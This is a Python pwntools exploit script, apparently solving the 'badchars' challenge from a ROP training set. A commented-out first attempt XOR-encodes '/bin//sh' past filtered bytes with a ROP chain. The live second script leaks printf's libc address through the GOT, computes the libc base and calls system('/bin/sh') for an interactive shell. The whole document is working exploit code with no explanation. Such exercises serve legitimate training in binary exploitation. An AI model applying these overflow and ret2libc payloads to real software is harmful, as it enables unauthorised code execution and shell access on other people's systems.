# from pwn import *

# context.log_level = 'debug'

# # sh = gdb.debug("./badchars")
# sh = process("./badchars")
# elf = ELF("./badchars")

# system = elf.plt['system']
# print(hex(system))
# binsh = "/bin//sh"
# data_addr = 0x601070
# pop_rdi = 0x400b39 # pop rdi ; ret

# mov_r13_r12 = 0x400b34 # mov qword ptr [r13], r12 ; ret
# pop_r12_r13 = 0x400b3b # pop r12 ; pop r13 ; ret

# xor_r15_r14 = 0x400b30 # xor byte ptr [r15], r14b ; ret
# pop_r14_r15 = 0x400b40 # pop r14 ; pop r15 ; ret

# # encode
# badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
# xor_byte = 0x1
# while(1):
#     xor_binsh = ""
#     for i in binsh:
#         temp_char = ord(i) ^ xor_byte
#         if temp_char in badchars:
#             xor_byte += 1
#             break
#         else:
#             xor_binsh += chr(temp_char)
#     if len(xor_binsh) == 8:
#         break
# print(xor_binsh)

# payload = b'a' * 0x28
# payload +=  p64(pop_r12_r13) + xor_binsh.encode("utf-8") + p64(data_addr) + p64(mov_r13_r12)
# for i in range(len(xor_binsh)):
#     payload += p64(pop_r14_r15) + p64(xor_byte) + p64(data_addr + i) + p64(xor_r15_r14)

# payload += p64(pop_rdi) + p64(data_addr) + p64(0x4006b1) + p64(system) 
# # payload += p64(pop_rdi) + p64(0x400C2F) + p64(0x4006b1) + p64(system) 
# # payload += p64(0x4009E3) 

# sh.recv()
# sh.sendline(payload)
# sh.recv()
# sh.interactive()

from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./badchars')
system_addr = elf.plt['system']
main_addr = elf.symbols['main']
ret_addr = 0x4006b1
pop_rdi = 0x400b39
call_put =  0x4008E9
printf_got = elf.got['printf']
printf_libc_addr = libc.symbols['printf']
bin_sh_libc_addr = next(libc.search(b'/bin/sh'))

io = process('./badchars')
payload1 = b'A' * 0x28 + p64(pop_rdi) + p64(printf_got) + p64(call_put) + b'b' * 8 +  p64(ret_addr)  + p64(main_addr)
#gdb.attach(io)
io.sendline(payload1)
io.recvuntil('>')
io.recvuntil('> ')
printf_addr = u64(io.recv(6).ljust(8, b'\0'))
print(hex(printf_addr))

libc_base = printf_addr - printf_libc_addr
print("libc_base==> " + str(hex(libc_base)))
print("bin_sh_libc_addr==> " + str(hex(bin_sh_libc_addr)))
bin_sh_addr = libc_base + bin_sh_libc_addr

payload2 = b'A' * 0x28 + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)
io.sendline(payload2)
io.interactive()